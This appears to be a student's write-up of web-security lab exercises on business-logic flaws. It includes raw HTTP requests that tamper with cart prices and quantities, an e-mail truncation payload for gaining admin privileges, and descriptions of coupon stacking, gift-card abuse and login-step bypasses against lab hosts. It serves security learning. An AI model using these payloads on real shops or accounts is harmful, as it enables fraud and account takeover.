# Business Logic Vulnerabilities (10/11)

Business logic vulnerabilities are those that arise from the flawed assumption of the user’s behavior, failing to include the appropriate security mechanisms in the application’s logic and allowing attackers to take advantage of it.

# Exploiting

## Excessive trust in client-side controls

The following shopping application checks for the product’s value based on information included in the client side of the application, allowing attackers to craft and edit requests before they are sent do the server, and consequently purchasing products with arbitrary prices.

```
POST /cart HTTP/2
Host: 0aee00ab0420f09280afcb6f00450037.web-security-academy.net
Cookie: session=6ftRjffxKFYAX6oK6N1CJYwKcqNggNI4
Content-Length: 49
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0aee00ab0420f09280afcb6f00450037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

productId=1&redir=PRODUCT&quantity=1&price=133700
```

*Original add to cart request*

```
POST /cart HTTP/2
Host: 0aee00ab0420f09280afcb6f00450037.web-security-academy.net
Cookie: session=6ftRjffxKFYAX6oK6N1CJYwKcqNggNI4
Content-Length: 49
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0aee00ab0420f09280afcb6f00450037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

productId=1&redir=PRODUCT&quantity=1&price=0001
```

*Edited request with product’s price set to $00.01*

![Untitled](./assets/untitled-0.png)

![Untitled](./assets/untitled-1.png)

The application also doesn’t perform any actions on checkout in order to check if the product’s price is correct.

## High-level logic vulnerability

The shopping application below performs the following POST request when a user removes an item from their cart:

```
POST /cart HTTP/2
Host: 0ade003a0376404b8243e26b006f00e3.web-security-academy.net
Cookie: session=qmmsLBX0Zre7Fr39IsSjfedj32wpBgUg
Content-Length: 34
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net/cart
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

productId=1&quantity=-1&redir=CART
```

It follows the same logic from the request used to add one item to the user’s cart, but with a negative value, subtracting the item.

This may seem okay, as the button that removes the item from the cart is not present when the cart is empty, but this doesn’t stop the client to send that same request again, but with the empty cart, resulting in the application to ad `-x` items to the user, and consequently, also a negative value relative to the amount of items added

```
POST /cart HTTP/2
Host: 0ade003a0376404b8243e26b006f00e3.web-security-academy.net
Cookie: session=qmmsLBX0Zre7Fr39IsSjfedj32wpBgUg
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

productId=2&quantity=-229&redir=CART
```

However, it does check the value of the cart before checkout, so we still don’t get infinite money. We can instead add an item with a high value that covers the negative we now have on the account, allowing us to purchase that new item for an extremely lower price.

```
POST /cart HTTP/2
Host: 0ade003a0376404b8243e26b006f00e3.web-security-academy.net
Cookie: session=qmmsLBX0Zre7Fr39IsSjfedj32wpBgUg
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

productId=1&quantity=1&redir=CART
```

![Untitled](./assets/untitled-2.png)

## Inconsistent security controls

Sometimes, the security controls for specific functionalities are implemented with a flawed logic. On the case below, the application allow users with a specific e-mail domain to access an admin panel on the website. Although the application sends a confirmation link to the e-mail provided in registration, it doesn’t check it when the user changes their e-mail for an existing account.

![Untitled](./assets/untitled-3.png)

It also contains an information disclosure right on the register page, making the exploitation much easier.

![Untitled](./assets/untitled-4.png)

![Untitled](./assets/untitled-5.png)

## Flawed enforcement of business rules

In this case, the application has made two coupons available: NEWCUST5 and SIGNUP30.

It does check if the coupon that the user is trying to apply is already applied, but fails to do it if the user alternates between the two coupons. The reason for this behavior is that the application is probably checking for the last applied coupon, instead of running through the set of applied ones and verifying if the one being attempted is already there, which would be more appropriate.

![Untitled](./assets/untitled-6.png)

![Untitled](./assets/untitled-7.png)

## Low-level logic flaw

integer overflow

![Untitled](./assets/untitled-8.png)

## Inconsistent handling of user input

In this one, the application also gives higher privileges to users under the e-mail “@dontwannacry.com”. 

It strips the user’s e-mail to 255 characters after registering though, which allow the attacker that has access to create subdomains in their e-mail client to create such payload:

```
username=banana&email=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaa%40dontwannacry.com.exploit-0a3300950473acc2813a062c01030059.exploit-server.net&password=banana
```

The e-mail’s length reaches 255 characters before the actual e-mail domain starts, so after checking for the user’s e-mail, it will grant the high privileges to the user.

![Untitled](./assets/untitled-9.png)

This behavior could occur on implementations using old databases or programming languages that had the first byte of a string value being the representation of the number of characters in that string. Therefore, as the highest integer that can be represented in a single byte is 256, a 256-byte-long string would only contain 255 characters in it’s value, because the first one would be `11111111`.

## **Weak isolation on dual-use endpoint**

On this example, the application performs a POST request in order to change a given user’s password.

![Untitled](./assets/untitled-10.png)

Although it theoretically checks the user’s current password, the parameter isn’t actually required, so we can just repeat the request without it, changing the password of an arbitrary user. 

![Untitled](./assets/untitled-11.png)

![Untitled](./assets/untitled-12.png)

## **Insufficient workflow validation**

On this lab, we can simply add the desired item to our cart and then hit the order confirmation endpoint, which doesn’t perform any validation about our balance, allowing us to purchase any items we want.

![Untitled](./assets/untitled-13.png)

![Untitled](./assets/untitled-14.png)

## **Authentication bypass via flawed state machine**

After sending the login credentials, the application redirects us to /role-selector upon success.

![Untitled](./assets/untitled-15.png)

If we use intercept to go through the login steps, we are able to drop the `GET /role-selector` request, making so it’s never sent.

![Untitled](./assets/untitled-16.png)

This way, when we go back to the application, we have received the default role, which is admin.

![Untitled](./assets/untitled-17.png)

## Infinite money logic flaw

In this case, the application gives us a coupon that gives us 30% OFF over anything we buy if we sign up to the store’s newsletter. However, we can also buy a 10$ gift card. This is a logic flaw, as a malicious user could repeatedly buy a lot of gift cards and submit the coupon on checkout, thus generating infinite money.

![Untitled](./assets/untitled-18.png)

![Untitled](./assets/untitled-19.png)

## **Providing an encryption oracle**